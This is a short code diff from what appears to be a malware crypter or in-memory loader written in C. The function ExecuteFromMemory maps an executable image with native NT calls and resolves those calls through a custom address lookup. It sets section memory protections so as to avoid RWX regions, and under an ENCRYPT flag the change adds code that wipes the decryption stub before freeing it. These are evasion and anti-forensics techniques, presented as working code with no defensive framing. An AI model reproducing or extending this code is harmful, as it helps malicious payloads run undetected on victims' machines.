@@ -175,7 +175,7 @@ static void ExecuteFromMemory(unsigned char* data) {
     NtMapViewOfSection(hSection, (HANDLE)-1, &base, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_WRITECOPY);
 
     // Pre-mark entire module as WC to avoid leftover RWX padding
-    ULONG oldProtect = 0;
+    ULONG oldProtect;
     NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
     NtProtectVirtualMemory((HANDLE)-1, &base, &viewSize, PAGE_WRITECOPY, &oldProtect);
 
@@ -184,7 +184,6 @@ static void ExecuteFromMemory(unsigned char* data) {
         PVOID sectionBase = (BYTE*)base + sec[i].VirtualAddress;
         SIZE_T sectionSize = sec[i].Misc.VirtualSize;
         ULONG newProtect = SectionProtection(sec[i].Characteristics);
-        oldProtect = 0;
         NtProtectVirtualMemory((HANDLE)-1, &sectionBase, &sectionSize, newProtect, &oldProtect);
     }
 
@@ -204,6 +203,9 @@ static void ExecuteFromMemory(unsigned char* data) {
 #ifdef ENCRYPT
     PVOID stubBase = data;
     SIZE_T stubSize = nt->OptionalHeader.SizeOfHeaders;
+	
+    NtProtectVirtualMemory((HANDLE)-1, &stubBase, &stubSize, PAGE_READWRITE, &oldProtect);
+    RtlSecureZeroMemory(stubBase, stubSize);
     NtFreeVirtualMemory((HANDLE)-1, &stubBase, &stubSize, MEM_RELEASE);
 #endif // ENCRYPT
 
